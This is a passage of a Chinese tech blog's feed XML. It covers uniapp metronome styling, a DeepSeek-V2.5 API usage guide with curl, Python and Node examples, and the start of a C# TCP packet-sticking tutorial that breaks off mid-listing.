class="title function_">onUnload</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 页面卸载时清理音频资源</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">audioContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">audioContext</span>.<span class="title function_">destroy</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.label</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.value</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#007aff</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.slider</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">90%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.button-group</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">gap</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.button</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#007aff</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.play-button</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#34c759</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">15px</span> <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.play-button</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#32a852</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;节拍器基础功能&quot;&gt;&lt;a href=&quot;#节拍器基础功能&quot; class=&quot;headerlink&quot; title=&quot;节拍器基础功能&quot;&gt;&lt;/a&gt;节拍器基础功能&lt;/h1&gt;&lt;p&gt;加速 前速 启动 暂停&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;ta</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="uniapp" scheme="https://banjinmei.github.io/tags/uniapp/"/>
    
  </entry>
  
  <entry>
    <title>DeepSeek-V2.5</title>
    <link href="https://banjinmei.github.io/2024/11/30/DeepSeek-V2-5/"/>
    <id>https://banjinmei.github.io/2024/11/30/DeepSeek-V2-5/</id>
    <published>2024-11-29T19:13:44.000Z</published>
    <updated>2024-11-29T19:18:43.503Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DeepSeek-V2-5"><a href="#DeepSeek-V2-5" class="headerlink" title="DeepSeek-V2.5"></a>DeepSeek-V2.5</h1><p>在目前大模型主流榜单中，DeepSeek-V2.5 均表现出色</p><h2 id="中文综合能力（AlignBench）位列开源榜首"><a href="#中文综合能力（AlignBench）位列开源榜首" class="headerlink" title="中文综合能力（AlignBench）位列开源榜首"></a>中文综合能力（AlignBench）位列开源榜首</h2><p>与 GPT-4-Turbo，文心 4.0 等闭源模型在评测中处于同一梯队</p><h2 id="英文综合能力（MT-Bench）处于第一梯队"><a href="#英文综合能力（MT-Bench）处于第一梯队" class="headerlink" title="英文综合能力（MT-Bench）处于第一梯队"></a>英文综合能力（MT-Bench）处于第一梯队</h2><p>英文综合能力（MT-Bench）与最强的开源模型 LLaMA3-70B 处于同一梯队，超过最强 MoE 开源模型 Mixtral8x22B</p><p>知识、数学、推理、编程等榜单结果位居前列<br>开源模型支持 128K 上下文</p><h1 id="api"><a href="#api" class="headerlink" title="api"></a>api</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl https://api.deepseek.com/chat/completions \</span><br><span class="line">  -H &quot;Content-Type: application/json&quot; \</span><br><span class="line">  -H &quot;Authorization: Bearer xx&quot; \</span><br><span class="line">  -d &#x27;&#123;</span><br><span class="line">        &quot;model&quot;: &quot;deepseek-chat&quot;,</span><br><span class="line">        &quot;messages&quot;: [</span><br><span class="line">          &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant.&quot;&#125;,</span><br><span class="line">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;stream&quot;: false</span><br><span class="line">      &#125;&#x27;</span><br></pre></td></tr></table></figure><h2 id="py"><a href="#py" class="headerlink" title="py"></a>py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Please install OpenAI SDK first: `pip3 install openai`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line">client = OpenAI(api_key=<span class="string">&quot;skx&quot;</span>, base_url=<span class="string">&quot;https://api.deepseek.com&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = client.chat.completions.create(</span><br><span class="line">    model=<span class="string">&quot;deepseek-chat&quot;</span>,</span><br><span class="line">    messages=[</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;你好，你是什么大模型？你能做什么？&quot;</span>&#125;,</span><br><span class="line">    ],</span><br><span class="line">    stream=<span class="literal">False</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.choices[<span class="number">0</span>].message.content)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="node"><a href="#node" class="headerlink" title="node"></a>node</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// Please install OpenAI SDK first: `npm install openai`</span><br><span class="line"></span><br><span class="line">import OpenAI from &quot;openai&quot;;</span><br><span class="line"></span><br><span class="line">const openai = new OpenAI(&#123;</span><br><span class="line">        baseURL: &#x27;https://api.deepseek.com&#x27;,</span><br><span class="line">        apiKey: &#x27;xx&#x27;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">async function main() &#123;</span><br><span class="line">  const completion = await openai.chat.completions.create(&#123;</span><br><span class="line">    messages: [&#123; role: &quot;system&quot;, content: &quot;You are a helpful assistant.&quot; &#125;],</span><br><span class="line">    model: &quot;deepseek-chat&quot;,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  console.log(completion.choices[0].message.content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到回答:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">你好！我是一个基于人工智能技术的大型语言模型，由深度求索（DeepSeek）公司开发。我的核心功能是通过大量文本数据训练，能够理解和生成自然语言，从而协助用户解答问题、提供信息、进行对话等。</span><br><span class="line"></span><br><span class="line">我能做的事情包括但不限于：</span><br><span class="line">1. **回答问题**：无论是科学知识、历史事件、文化常识还是日常生活中的疑问，我都可以尽力提供准确的信息。</span><br><span class="line">2. **提供建议**：在某些情况下，我可以根据你的需求提供一些建议或指导。</span><br><span class="line">3. **语言翻译**：虽然我的主要语言是中文，但我也可以理解和生成其他语言的文本，帮助进行简单的翻译工作。</span><br><span class="line">4. **文本创作**：我可以协助撰写文章、故事、报告等文本内容，提供创意和写作支持。</span><br><span class="line">5. **学习辅导**：在教育领域，我可以提供一些基础的学习辅导，帮助理解复杂的概念。</span><br><span class="line"></span><br><span class="line">请注意，虽然我尽力提供准确和有用的信息，但我也有局限性，尤其是在处理非常专业或最新的信息时。我的知识截止日期是2023年，因此对于之后发生的事件或发展的信息可能不准确或不完整。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Temperature-设置"><a href="#Temperature-设置" class="headerlink" title="Temperature 设置"></a>Temperature 设置</h1><p>temperature 参数默认为 1.0。</p><p>场景温度<br>代码生成&#x2F;数学解题   0.0<br>数据抽取&#x2F;分析1.0<br>通用对话1.3<br>翻译1.3<br>创意类写作&#x2F;诗歌创作1.5</p><h1 id="token-和字数的换算比"><a href="#token-和字数的换算比" class="headerlink" title="token 和字数的换算比"></a>token 和字数的换算比</h1><p>1 个英文字符 ≈ 0.3 个 token。<br>1 个中文字符 ≈ 0.6 个 token。</p><h1 id="错误码描述"><a href="#错误码描述" class="headerlink" title="错误码描述"></a>错误码描述</h1><p>400 - 格式错误原因：请求体格式错误<br>解决方法：请根据错误信息提示修改请求体<br>401 - 认证失败原因：API key 错误，认证失败<br>解决方法：请检查您的 API key 是否正确，如没有 API key，请先 创建 API key<br>402 - 余额不足原因：账号余额不足<br>解决方法：请确认账户余额，并前往 充值 页面进行充值<br>422 - 参数错误原因：请求体参数错误<br>解决方法：请根据错误信息提示修改相关参数<br>429 - 请求速率达到上限原因：请求速率（TPM 或 RPM）达到上限<br>解决方法：请合理规划您的请求速率。<br>500 - 服务器故障原因：服务器内部故障<br>解决方法：请等待后重试。若问题一直存在，请联系我们解决<br>503 - 服务器繁忙原因：服务器负载过高<br>解决方法：请稍后重试您的请求</p><h1 id="JSON-Output"><a href="#JSON-Output" class="headerlink" title="JSON Output"></a>JSON Output</h1><p>在很多场景下，用户需要让模型严格按照 JSON 格式来输出，以实现输出的结构化，便于后续逻辑进行解析。</p><p>DeepSeek 提供了 JSON Output 功能，来确保模型输出合法的 JSON 字符串。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>设置 response_format 参数为 {‘type’: ‘json_object’}。<br>用户传入的 system 或 user prompt 中必须含有 json 字样，并给出希望模型输出的 JSON 格式的样例，以指导模型来输出合法 JSON。<br>需要合理设置 max_tokens 参数，防止 JSON 字符串被中途截断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line">client = OpenAI(</span><br><span class="line">    api_key=<span class="string">&quot;&lt;your api key&gt;&quot;</span>,</span><br><span class="line">    base_url=<span class="string">&quot;https://api.deepseek.com&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">system_prompt = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">The user will provide some exam text. Please parse the &quot;question&quot; and &quot;answer&quot; and output them in JSON format. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EXAMPLE INPUT: </span></span><br><span class="line"><span class="string">Which is the highest mountain in the world? Mount Everest.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EXAMPLE JSON OUTPUT:</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;question&quot;: &quot;Which is the highest mountain in the world?&quot;,</span></span><br><span class="line"><span class="string">    &quot;answer&quot;: &quot;Mount Everest&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">user_prompt = <span class="string">&quot;Which is the longest river in the world? The Nile River.&quot;</span></span><br><span class="line"></span><br><span class="line">messages = [&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: system_prompt&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: user_prompt&#125;]</span><br><span class="line"></span><br><span class="line">response = client.chat.completions.create(</span><br><span class="line">    model=<span class="string">&quot;deepseek-chat&quot;</span>,</span><br><span class="line">    messages=messages,</span><br><span class="line">    response_format=&#123;</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;json_object&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(json.loads(response.choices[<span class="number">0</span>].message.content))</span><br></pre></td></tr></table></figure><p>模型将会输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;question&quot;</span>: <span class="string">&quot;Which is the longest river in the world?&quot;</span>,</span><br><span class="line">    <span class="string">&quot;answer&quot;</span>: <span class="string">&quot;The Nile River&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Function-Calling"><a href="#Function-Calling" class="headerlink" title="Function Calling"></a>Function Calling</h1><p>Function Calling 让模型能够调用外部工具，来增强自身能力。</p><p>获取用户当前位置的天气信息为例，展示了使用 Function Calling 的完整 Python 代码。</p><p>Function Calling 的具体 API 格式请参考对话补全文档。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_messages</span>(<span class="params">messages</span>):</span><br><span class="line">    response = client.chat.completions.create(</span><br><span class="line">        model=<span class="string">&quot;deepseek-chat&quot;</span>,</span><br><span class="line">        messages=messages,</span><br><span class="line">        tools=tools</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> response.choices[<span class="number">0</span>].message</span><br><span class="line"></span><br><span class="line">client = OpenAI(</span><br><span class="line">    api_key=<span class="string">&quot;&lt;your api key&gt;&quot;</span>,</span><br><span class="line">    base_url=<span class="string">&quot;https://api.deepseek.com&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">tools = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>,</span><br><span class="line">        <span class="string">&quot;function&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;get_weather&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Get weather of an location, the user shoud supply a location first&quot;</span>,</span><br><span class="line">            <span class="string">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,</span><br><span class="line">                <span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;location&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;The city and state, e.g. San Francisco, CA&quot;</span>,</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;required&quot;</span>: [<span class="string">&quot;location&quot;</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">messages = [&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;How&#x27;s the weather in Hangzhou?&quot;</span>&#125;]</span><br><span class="line">message = send_messages(messages)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;User&gt;\t <span class="subst">&#123;messages[<span class="number">0</span>][<span class="string">&#x27;content&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">tool = message.tool_calls[<span class="number">0</span>]</span><br><span class="line">messages.append(message)</span><br><span class="line"></span><br><span class="line">messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;tool&quot;</span>, <span class="string">&quot;tool_call_id&quot;</span>: tool.<span class="built_in">id</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;24℃&quot;</span>&#125;)</span><br><span class="line">message = send_messages(messages)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Model&gt;\t <span class="subst">&#123;message.content&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个例子的执行流程如下：</p><p>用户：询问现在的天气<br>模型：返回 function get_weather({location: ‘Hangzhou’})<br>用户：调用 function get_weather({location: ‘Hangzhou’})，并传给模型。<br>模型：返回自然语言，”The current temperature in Hangzhou is 24°C.”<br>注：上述代码中 get_weather 函数功能需由用户提供，模型本身不执行具体函数。</p><p>此外还有上下文，缓存等</p><h1 id="能做什么？"><a href="#能做什么？" class="headerlink" title="能做什么？"></a>能做什么？</h1><p><strong>提示库</strong><br>探索 DeepSeek 提示词样例，挖掘更多可能</p><p><strong>代码改写</strong><br>对代码进行修改，来实现纠错、注释、调优等。</p><p><strong>代码解释</strong><br>对代码进行解释，来帮助理解代码内容。</p><p><strong>代码生成</strong><br>让模型生成一段完成特定功能的代码。</p><p><strong>内容分类</strong><br>对文本内容进行分析，并对齐进行自动归类</p><p><strong>结构化输出</strong><br>将内容转化为 Json，来方便后续程序处理</p><p><strong>角色扮演（自定义人设）</strong><br>自定义人设，来与用户进行角色扮演。</p><p><strong>角色扮演（情景续写）</strong><br>提供一个场景，让模型模拟该场景下的任务对话</p><p><strong>散文写作</strong><br>让模型根据提示词创作散文</p><p><strong>诗歌创作</strong><br>让模型根据提示词，创作诗歌</p><p><strong>文案大纲生成</strong><br>根据用户提供的主题，来生成文案大纲</p><p><strong>宣传标语生成</strong><br>让模型生成贴合商品信息的宣传标语。</p><p><strong>模型提示词生成</strong><br>根据用户需求，帮助生成高质量提示词</p><p><strong>中英翻译专家</strong><br>中英文互译，对用户输入内容进行翻译</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DeepSeek-V2-5&quot;&gt;&lt;a href=&quot;#DeepSeek-V2-5&quot; class=&quot;headerlink&quot; title=&quot;DeepSeek-V2.5&quot;&gt;&lt;/a&gt;DeepSeek-V2.5&lt;/h1&gt;&lt;p&gt;在目前大模型主流榜单中，DeepSeek-V2.5 </summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>packet splicing</title>
    <link href="https://banjinmei.github.io/2024/11/27/packet-splicing/"/>
    <id>https://banjinmei.github.io/2024/11/27/packet-splicing/</id>
    <published>2024-11-27T14:46:43.000Z</published>
    <updated>2024-11-27T14:51:40.459Z</updated>
    
    <content type="html"><![CDATA[<p>：</p><h1 id="模拟粘包的场景"><a href="#模拟粘包的场景" class="headerlink" title="模拟粘包的场景"></a>模拟粘包的场景</h1><p>粘包通常在发送端因数据频繁写入缓冲区并一起发送，或者在接收端没有明确的分包逻辑导致读取不完整的数据包时发生。</p><h1 id="使用固定分隔符或包头-包体"><a href="#使用固定分隔符或包头-包体" class="headerlink" title="使用固定分隔符或包头+包体"></a>使用固定分隔符或包头+包体</h1><p>常见的解决粘包方案是使用分隔符（如 \n 或特殊字符），或采用固定的包头标识数据长度。</p><p>服务端代码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">TcpServer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        TcpListener listener = <span class="keyword">new</span> TcpListener(IPAddress.Any, <span class="number">5000</span>);</span><br><span class="line">        listener.Start();</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Server started, waiting for connection...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Socket clientSocket = listener.AcceptSocket();</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Client connected!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">byte</span>[] buffer = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="built_in">int</span> bytesRead;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((bytesRead = clientSocket.Receive(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> receivedData = Encoding.UTF8.GetString(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Received: <span class="subst">&#123;receivedData&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟数据未分包的场景</span></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Processing received data...&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span>[] messages = receivedData.Split(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> message <span class="keyword">in</span> messages)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrEmpty(message))</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;Processed: <span class="subst">&#123;message&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        clientSocket.Close();</span><br><span class="line">        listener.Stop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 